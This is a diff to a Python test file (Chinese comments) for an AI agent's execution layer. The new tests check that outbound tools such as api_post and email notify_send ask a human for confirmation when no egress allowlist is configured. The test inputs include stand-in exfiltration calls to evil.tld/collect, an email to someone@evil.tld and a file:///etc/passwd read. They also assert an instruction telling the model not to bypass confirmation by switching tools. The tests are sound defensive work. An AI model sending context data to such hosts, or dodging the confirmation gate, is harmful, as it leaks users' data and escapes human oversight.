@@ -1453,6 +1453,9 @@ check("notify_send 文件渠道落盘", r["status"] == "SUCCESS"
       and (el_h.project_root / "notifications.log").exists()
       and "测试通知" in (el_h.project_root / "notifications.log").read_text(encoding="utf-8"), r)
 r = run_agent(el_h, "notify_send", channel="email", to="x@example.com", content="hi")
+check("email 渠道先要人确认（SEC-013 后半：收件人由模型给）",
+      r["status"] == "PERMISSION_REQUEST", r)
+r = run_confirmed(el_h, "notify_send", channel="email", to="x@example.com", content="hi")
 check("email 无 SMTP 配置返回 501", r["status"] == "501", r)
 
 r = run_agent(el_h, "browser_open", url="file:///etc/passwd")
@@ -3401,6 +3404,66 @@ check("web_tools 所有 safe_request 调用都接了 on_hop",
 check("execution_layer 把 egress_allowlist 透给执行器",
       "egress_allowlist=(config or {}).get(\"egress_allowlist\")" in
       (Path(__file__).parent / "execution_layer.py").read_text(encoding="utf-8"))
+
+# —— 外发闸门（SEC-013 后半）：目的地不在任何清单里 → 由人点头 ——
+# 白名单是"挡不住就别去"，这条闸门管的是清单**没配**时的默认档：那时谁都能收，
+# 一次注入就能把上下文里的东西 POST 出去。默认档里唯一还站着的就是"人看一眼"。
+from execution_layer import EGRESS_TOOLS as _EGRESS_TOOLS  # noqa: E402
+
+check("注册表标记的外发工具已同步到执行层",
+      {"api_post", "api_get", "browser_open", "browser_navigate",
+       "image_generate", "notify_send"} <= _EGRESS_TOOLS, sorted(_EGRESS_TOOLS))
+
+_egw = ExecutionLayer(project_root=str(mktemp()), permission_level="write",
+                      config={"bait": {"enabled": False}})
+_r_eg1 = _egw._stage_permission({"tool": "api_post", "url": "https://evil.tld/collect",
+                                 "data": {"k": "v"}}, "api_post", {}, _RC())
+check("未配白名单时 api_post 到任意域名 → 需要人确认",
+      _r_eg1 is not None and _r_eg1["status"] == "PERMISSION_REQUEST"
+      and "evil.tld" in _r_eg1.get("reason", ""), _r_eg1)
+check("外发确认的指令不许模型换工具绕过、并指向 egress_allowlist",
+      _r_eg1 is not None and "绕过确认" in _r_eg1.get("instruction", "")
+      and "egress_allowlist" in _r_eg1.get("instruction", ""),
+      _r_eg1.get("instruction") if _r_eg1 else None)
+_r_eg2 = _egw._stage_permission({"tool": "api_get",
+                                 "url": "https://html.duckduckgo.com/html/?q=x"},
+                                "api_get", {}, _RC())
+check("内置端点（搜索/图片服务）不问 —— 否则默认档每次联网都要点一下",
+      _r_eg2 is None, _r_eg2)
+_r_eg3 = _egw._stage_permission({"tool": "notify_send", "channel": "console",
+                                 "content": "hi"}, "notify_send", {}, _RC())
+check("notify_send console 不出本机 → 不问", _r_eg3 is None, _r_eg3)
+_r_eg4 = _egw._stage_permission({"tool": "notify_send", "channel": "email",
+                                 "to": "someone@evil.tld", "content": "…"},
+                                "notify_send", {}, _RC())
+check("notify_send email（收件人由模型给）→ 需要人确认",
+      _r_eg4 is not None and _r_eg4["status"] == "PERMISSION_REQUEST", _r_eg4)
+_r_eg5 = _egw._stage_permission({"tool": "image_generate", "prompt": "x"},
+                                "image_generate", {}, _RC())
+check("image_generate 的目的地是内置图片服务 → 不问（prompt 外发的账记在 SECURITY-MODEL）",
+      _r_eg5 is None, _r_eg5)
+
+# 配了白名单 = 把"问人"一次性授权掉；用户刚批过的那次调用也不重复问
+_egal = ExecutionLayer(project_root=str(mktemp()), permission_level="write",
+                       config={"bait": {"enabled": False},
+                               "egress_allowlist": ["api.github.com"]})
+_r_eg6 = _egal._stage_permission({"tool": "api_get", "url": "https://api.github.com/repos"},
+                                 "api_get", {}, _RC())
+check("白名单内的目的地不再逐次确认（白名单即授权）", _r_eg6 is None, _r_eg6)
+_r_eg7 = _egal._stage_permission({"tool": "api_get", "url": "https://evil.tld/x"},
+                                 "api_get", {}, _RC())
+check("白名单外仍要人确认（随后工具层 403 兜底）", _r_eg7 is not None, _r_eg7)
+_egw.permission.grant_temp("api_post")
+_r_eg8 = _egw._stage_permission({"tool": "api_post", "url": "https://evil.tld/collect"},
+                                "api_post", {}, _RC())
+check("用户刚批准的那次外发不重复问", _r_eg8 is None, _r_eg8)
+
+# 会话级授权是按**工具名**给的，不区分目的地："本会话 api_post 免问"= 出口全开。
+# 要免问就用 egress_allowlist 指定域名（授权给谁），所以这里把会话级降级成单次。
+check("会话级授权对外发工具降级为单次（授权给谁 ≠ 授权做什么）",
+      _egw.permission.grant_session("api_post") is False
+      and "api_post" in _egw.permission.temp_grants
+      and "api_post" not in _egw.permission.session_grants)
 
 # ============================================================
 print("[24] 收口补齐 —— 检索落点 / 读改写编码 / 409 熔断 / SQL 连接级只读 / SMTP 出站")
